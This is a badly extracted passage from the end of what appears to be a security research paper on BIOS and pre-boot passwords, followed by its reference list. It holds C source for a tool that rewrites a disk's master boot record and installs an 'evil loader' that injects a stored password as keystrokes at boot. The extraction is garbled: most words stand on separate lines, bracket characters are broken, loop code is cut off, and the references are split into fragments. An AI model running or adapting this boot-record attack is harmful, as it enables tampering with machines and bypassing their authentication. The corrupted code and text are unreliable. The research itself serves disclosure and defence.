'J',
'K',
'L',
'M',
'N',
'O',
'P',
'Q',
'R',
'S',
'T',
'U',
'V',
'W',
'X',
'Y',
'Z','a',
'b',
'c',
'd',
'e',
'f',
'g',
'h',
'i',
'j',
'k',
'l',
'm',
'n',
'o',
'p',
'q',
'r',
's',
't',
'u',
'v',
'w',
'x',
'y',
'z',
'!',
'@',
'#',
'$',
'%',
'^',
'&',
'*',
'(',
')',
'_',
'-',
'=',
'+',
'[',
'{',
'℄',
'}',
';',
':','\'',
'"',
'`',
'~',
'|',
'\\',
'',
'.',
'?',
'/',
'*',
'-',
0x19
/*
down
key
*/,
0x18
/*
up
key
*/,
0x1a
/*
right
key*/,
0x1b
/*
left
key
*/,
0x0d
/*
Enter
*/,
0x1b
/*
Esc
*/,
0x20
/*
space
*/
};
char
scancodes2[℄=
{0x0B,
0x02,
0x03,
0x04,
0x05,
0x06,
0x07,
0x08,
0x09,
0x0A,
0x1E,
0x30,
0x2E,
0x20,
0x12,
0x21,
0x22,
0x23,
0x17,
0x24,
0x25,
0x26,
0x32,
0x31,
0x18,
0x19,
0x10,
0x13,
0x1F,
0x14,
0x16,
0x2F,
0x11,
0x2D,
0x15,
0x2C,
0x1E,
0x30,
0x2E,
0x20,
0x12,
0x21,
0x22,
0x23,
0x17,
0x24,
0x25,
0x26,
0x32,
0x31,
0x18,
0x19,
0x10,
0x13,
0x1F,
0x14,
0x16,
0x2F,
0x11,
0x2D,
0x15,
0x2C,
0x02,
0x03,
0x04,
0x05,
0x06,
0x07,
0x08,
0x09,
0x0A,
0x0B,
0x0C,
0x0C,
0x0D,
0x0D,
0x1A,
0x1A,
0x1B,
0x1B,
0x27,
0x27,
0x28,
0x28,
0x29,
0x29,
0x2B,
0x2B,
0x33,
0x33,
0x34,
0x34,
0x35,
0x35,
0x37,
0x4A,
0x50,
0x48,
0x4D,
0x4B,
0x1C,
0x01,
0x39
}
;
char
password[16℄={0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00,
0x00};
char
password2[32℄;
/*
*
Remove
one
character
from
the
translated
password
buffer
*/
int
remove_char(int
j)
{
int
i;
for
(i=j;i℄
[--password=℄\n"
"\n"
"--help
(or
-h)
display
this
help\n"
"--disk
(or
-d)
device
containing
the
MBR\n"
"--password
(or
-p)
file
containing
the
desired
input\n"
"\n
THIS
WILL
MODIFY
YOUR
MASTER
BOOT
RECORD\n"
"
DONT
USE
UNTIL
YOU
KNOW
WHAT
YOU
ARE
DOING\n\n",
argv[0℄);
exit(-2);
}
int
main
(int
argc,
char
*
argv[℄)
{
char
PASSWORD_FILE[BUFF_LENGTH℄;
char
DISK_NAME[BUFF_LENGTH℄;
int
fd;
int
c,i,j=0,
retaddr,jumpposition;
FILE
*
passwdfile;
if
(argc
=
9
)
{
printf("Could't
find
initial
jmp
short
:
quiting\n");
exit(-1);
}
else
{
jumpposition
=
i
+
1;
}
retaddr=
*
(map
+
jumpposition)
+2;
printf("
[*℄
Initial
jump:
0x%x
at
position
0x%x\n",
retaddr,jumpposition);
/*
*
search
for
a
DISK_OFFSET
bytes
long
buffer
filled
with
0x00
*
to
back
up
MBR
*/
j
=
0;
for
(i=513;i=
BUFF_SIZE
)
{
break;
}
}
/*
*
No
suitable
buffer
found,
quit
*/
if
(i
>=
DISK_OFFSET
-
10)
{
printf("
[*℄
No
suitable
buffer
found,
try
a
larger
disk
offset\n");
exit(-1);
}
else
{
/*
*
Ok,
we
have
a
suitable
buffer
*/
i
=
i
-
BUFF_SIZE;
printf("
[*℄
Found
%d
bytes
buffer
at
offset
0x%4x\n",j,i);
}
/*
*
Backup
original
bootloader
to
buffer
*/
if(!memcpy(map
+
i,map,512))
{
printf("backup
of
the
original
MBR
failed,
quitting\n");
exit(-1);
}
else
{
printf("
[*℄
backup
of
MBR
successful\n");
}
/*
*
Modify
the
address
of
the
MBR
backup
in
our
evil
loader
*/
evilloader[10℄
=
i
%
256
;
evilloader[11℄
=
i
/
256
;
/*
*
Get
the
password
translated
to
the
'keystroke
+
scancode'
format
*
and
copy
it
to
shellcode
*/
printf("
[*℄
Password:\n[%s℄\n\n",password);
if(
convert_password())
{
printf("Invalid
character
in
password...\nquitting\n");
exit(-1);
}
else
{
load_password();
}
/*
*
copy
our
custom
bootloader
at
intial
"jump
short..."
landing
*/
if(
!memcpy(map+retaddr+jumpposition,evilloader,sizeof(evilloader))
)
{
printf("Installation
of
evil
loader
failed,
quitting\n");
exit(-1);
}
else
{
printf("
[*℄
Installed
evil
loader
at
offset
0x%x\n"
,retaddr+jumpposition
);
}
/*
*
Clean
and
quit
*/
if
(munmap(map,
(DISK_OFFSET/PageSize
+1)*PageSize
)
<
0)
{
perror("Error
while
freeing
memory...\n");
}
close(fd);
return
0;
}
References
1.
Northcutt,
S.,
Filkins,
B.:
(Encryption
pro
curemen
t:
Setting
a
stan-
dard)
2.
Sk
orob
ogato
v,
S.:
Lo
w
temp
erature
data
remanence
in
static
ram.
T
ec
hnical
rep
ort
(2002)
3.
J.
Alex
Halderman,
Seth
D.
Sc
ho
en,
N.H.W.C.W.P
.J.A.C.A.J.F.J.A.,
F
elten,
E.W.:
Lest
w
e
remem
b
er:
Cold
b
o
ot
attac
ks
on
encryption
k
eys.
(2008)
4.
P
erciv
al,
C.:
Cac
he
missing
for
fun
and
prot.
(2005)
5.
Boileau,
A.,
Ruxcon
(2006)
6.
Duot,
L.:
Securit
y
issues
related
to
p
en
tium
system
managemen
t
mo
de,
CanSecW
est
(2006)
7.
BSDaemon,
coidelok
o,
D.:
System
managemen
t
mo
de
hac
k
using
smm
for
"other
purp
oses".
(Phrac
k
magazine)
8.
Brossard,
J.:
Bios
information
leak
age.
(2005)
9.
Pho
enix,
Compaq,
I.,
Microsoft:
Bios
b
o
ot
sp
ecication
v
ersion
1.01.
T
ec
hnical
rep
ort
(1996)
10.
Pro
ject,
T.F.D.:
F
reebsd
arc
hitecture
handb
o
ok.
T
ec
hnical
rep
ort
(2006)
11.
In
tel:
In
tel
64
and
ia-32
arc
hitectures
soft
w
are
dev
elop
er's
man
ual.
In:
V
olume
1:
Basic
Arc
hitecture,
P
.O.
Bo
x
5937,
Den
v
er
CO
80217-
9808
(2008)
12.
In
tel:
In
tel
64
and
ia-32
arc
hitectures
soft
w
are
dev
elop
er's
man
ual.
In:
V
olume
3A:
System
Programming
Guide,
P
.O.
Bo
x
5937,
Den
v
er
CO
80217-9808
(2008)
13.
Crouc
her,
P
.:
The
BIOS
Companion:
The
b
o
ok
that
do
esn't
come
with
y
our
motherb
oard!
Bo
okSurge
Publishing
(2004)
14.
Aiv
azian,
T.:
Lin
ux
k
ernel
2.4
in
ternals.
T
ec
hnical
rep
ort,
V
eritas
(2002)
15.
Co
x,
A.:
(Lin
ux
2.4
bios
usage
reference)
16.
Lin
ux:
(Lin
ux
k
ernel)
17.
Dunlap,
R.:
Lin
ux
2.4.x
initialization
for
ia-32
ho
wto.
T
ec
hnical
rep
ort,
IEEE
(2001)
18.
Microsoft:
(Bitlo
c
k
er
driv
e
encryption:
V
alue-add
extensibilit
y
op-
tions)
19.
Bro
wn,
R.:
(Ralf
bro
wn's
in
terrupt
list,
in
terruption
0x16
(k
eyb
oard
related))
20.
Bro
wn,
R.:
(Ralf
bro
wn's
in
terrupt
list,
in
terruption
0x09,
irq1
(k
ey-
b
oard
data
ready))
21.
Lilo:
(Lin
ux
loader
source
co
de)
22.
In
tel:
Upi-41ah/42ah
univ
ersal
p
eripheral
in
terface
8-bit
sla
v
e
mi-
cro
con
troller.
T
ec
hnical
rep
ort,
(In
tel
Corp
oration)
23.
In
tel:
8259a
programmable
in
terrupt
con
troller
(8259a/8259a-2).
T
ec
hnical
rep
ort,
(In
tel
Corp
oration)
24.
Hyde,
R.:
Chapter
20
:
The
PC
Keyb
oard.
In:
The
art
of
assem
bly
language
programming.
UCR
Standard
Library
for
80x86
Assem
bly
Language
Programmers
(1996)
25.
Hurt,
R.:
(Bios
data
area
mapping)
26.
Daniel
P
.
Bo
v
et,
M.C.
In:
Understanding
the
Lin
ux
k
ernel.
O'Reilly
(2002)
27.
Lrmi:
(Lin
ux
real
mo
de
in
terface
pro
ject
page
at
sourceforge)
28.
Grsecurit
y:
(Grsecurit
y
home
page)
29.
Malyugin,
V.S.:
(Debugging
lin
ux
k
ernels
with
vm
w
are
w
orkstation
6.0)
30.
Co
olQ:
Hac
king
grub
for
fun
and
prot.
(Phrac
k
magazine)
31.
Scythale:
Hac
king
deep
er
in
the
system.
(Phrac
k
magazine)
32.
Salih
un,
D.M.
Co
de
Break
er
(2004)
33.
Brossard,
J.:
(Cv
e-2005-4176
:
A
w
ard
bios
mo
dular
4.50pg
do
es
not
clear
the
k
eyb
oard
buer
after
reading
the
bios
passw
ord)
34.
Brossard,
J.:
(Cv
e-2005-4175
:
Insyde
bios
v190
do
es
not
clear
the
k
eyb
oard
buer
after
reading
the
bios
passw
ord)